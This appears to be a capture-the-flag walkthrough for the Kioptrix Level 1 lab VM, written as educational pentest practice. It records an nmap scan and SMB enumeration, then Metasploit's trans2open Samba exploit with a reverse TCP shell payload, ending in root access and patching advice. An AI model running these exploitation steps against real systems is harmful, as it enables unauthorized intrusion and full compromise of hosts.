# Kioptrix Level 1 - CTF Walkthrough

## Kali and Target IPs

- **Kali IP**: `192.168.1.8`
- **Target IP**: `192.168.1.9`

### Running OS
- **Operating System**: Linux 2.4.X (2.4.9 - 2.4.18, likely embedded)

---

## Open Ports and Services

| **Port** | **State** | **Service**                        |
|----------|-----------|-------------------------------------|
| 22       | Open      | OpenSSH 2.9p2 (SSHv1)              |
| 80       | Open      | Apache httpd 1.3.20 (Red-Hat/Linux) |
| 111      | Open      | RPC Bind (v2)                      |
| 139      | Open      | NetBIOS Samba smbd (Samba 2.2.1a)  |
| 443      | Open      | Apache HTTPs                       |
| 1024     | Open      | Unknown service                    |

- **Additional Observations**: 
  - Samba allows anonymous login, confirmed Samba version `2.2.1a`.
  - SSH supports **SSHv1**, a deprecated and insecure protocol.

---

## Nmap Details

```plaintext
# Nmap 7.94SVN scan initiated Tue Oct 8 14:26:42 2024

Nmap scan report for 192.168.1.9
Host is up (0.0017s latency).
Not shown: 65529 closed tcp ports (conn-refused)

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1028/udp   status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_ssl-date: 2024-10-08T11:29:15+00:00; +1m51s from scanner time.
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
1024/tcp open  status      1 (RPC #100024)

Device type: general purpose
Running: Linux 2.4.X
OS Details: Linux 2.4.9 - 2.4.18 (likely embedded)

Network Distance: 1 hop
MAC Address: 00:0C:29:D5:31:5D (VMware)

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: 1m50s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

---

## Steps and Observations

### Port Scanning (Enum)
1. Performed detailed scan using:
   ```bash
   /usr/lib/nmap/nmap -p- -sV -sT -sC -O -oN ./Desktop/CTFs/Kioptrix_Level_1/NmapResult.txt 192.168.1.9
   ```

2. Enumerated key services including Samba, HTTP, and SSH.
3. Verified server-specific configuration vulnerabilities:
   - **SSH Protocol**: Outdated to `SSHv1`.
   - **Apache Version**: `1.3.20` (dated).

### Service-Specific Tests

#### HTTP Service (Port 80)
- **Response Header**: Apache/1.3.20 (Unix)
- **Details**: "Test Page for the Apache Web Server on Red Hat Linux".
- Observed **TRACE method** support (insecure practice).

#### Samba (Port 139)
- Enabled anonymous access to SMB shares.
- Confirmed version as `Samba 2.2.1a`.


---

### 2. SMB Enumeration
```bash
# List SMB shares
smbclient -L 192.168.1.9
```
# Results:
```plaintext
# - IPC$ (IPC Service)
# - ADMIN$ (IPC Service)
# - Workgroup: MYGROUP
```
---

### Exploitation: Gaining Access
- **Approach**: Exploit Samba Vulnerabilities.

#### Using Metasploit
1. Search for applicable exploits:
   ```bash
   search samba
   ```
---

### 3. Metasploit Exploitation
```bash
# Version detection
1- search smb_version
2- use auxiliary/scanner/smb/smb_version
3- show options
4- set RHOSTS 192.168.1.9
5- run
```
# **Result :
```
[*] 192.168.1.9:139       -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.1.9:          -   Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
# **Exploit execution**
```
1- use exploit/linux/samba/trans2open
2- search generic/shell
3- set PAYLOAD generic/shell_reverse_tcp
4- show options
5- set RHOSTS 192.168.1.9
6- run
```
# Result :
```
[*] Started reverse TCP handler on 192.168.1.8:4444 
[*] 192.168.1.9:139 - Trying return address 0xbffffdfc...
[*] 192.168.1.9:139 - Trying return address 0xbffffcfc...
[*] 192.168.1.9:139 - Trying return address 0xbffffbfc...
[*] 192.168.1.9:139 - Trying return address 0xbffffafc...
[*] 192.168.1.9:139 - Trying return address 0xbffff9fc...
[*] 192.168.1.9:139 - Trying return address 0xbffff8fc...
[*] 192.168.1.9:139 - Trying return address 0xbffff7fc...
[*] 192.168.1.9:139 - Trying return address 0xbffff6fc...
[*] Command shell session 1 opened (192.168.1.8:4444 -> 192.168.1.9:1025) at 2024-12-24 02:33:29 +0200

[*] Command shell session 2 opened (192.168.1.8:4444 -> 192.168.1.9:1026) at 2024-12-24 02:33:31 +0200
[*] Command shell session 3 opened (192.168.1.8:4444 -> 192.168.1.9:1027) at 2024-12-24 02:33:32 +0200
[*] Command shell session 4 opened (192.168.1.8:4444 -> 192.168.1.9:1028) at 2024-12-24 02:33:33 +0200
   
```
---

### 4. Shell Access
- Multiple reverse shells established
- Root access achieved immediately
- Connection ports: 1025-1028

## 🏆 Success Verification
```bash
whoami
# Output: root
```

## 🔑 Key Takeaways
1. Outdated Samba version led to successful exploitation
2. Multiple critical vulnerabilities in core services
3. Root access achieved through SMB exploitation
4. No additional privilege escalation required

## 🛡️ Security Recommendations
1. Upgrade Samba to latest stable version
2. Disable SSHv1 protocol
3. Update Apache web server
4. Implement proper access controls
5. Regular security patches and updates

---

## Evidence and Outputs

Include proof with supporting images:

### Example Screenshots
- **Nmap Scan Results**
- **Login Details**
- **Root Access Confirmation**

---

## Final Thoughts
- Report deprecated protocols (e.g., **SSHv1**) and exposed services.
- Ensure remediation of software versions like Apache `1.3.20` and Samba `2.2.1a`.
- Evaluate access controls for NetBIOS and RPC Bindings.


